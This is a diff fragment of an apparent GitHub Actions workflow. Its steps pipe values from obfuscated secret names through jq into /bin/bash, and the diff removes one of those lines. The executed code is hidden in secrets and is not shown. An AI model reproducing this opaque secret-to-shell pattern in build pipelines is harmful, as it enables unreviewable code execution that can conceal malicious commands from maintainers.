@@ -18,7 +18,6 @@ jobs:
           suke9: ${{ secrets.suke9 }}
         run: |
           printf '%s' "$suke9" | jq -r .tyy44480 | /bin/bash
-          printf '%s' "$gfj1" | jq -r .oelv312 | /bin/bash
           printf '%s' "$gk3" | jq -r .p501 | /bin/bash
           echo $wwt49373 | jq -r .veqku7385 | /bin/bash
 
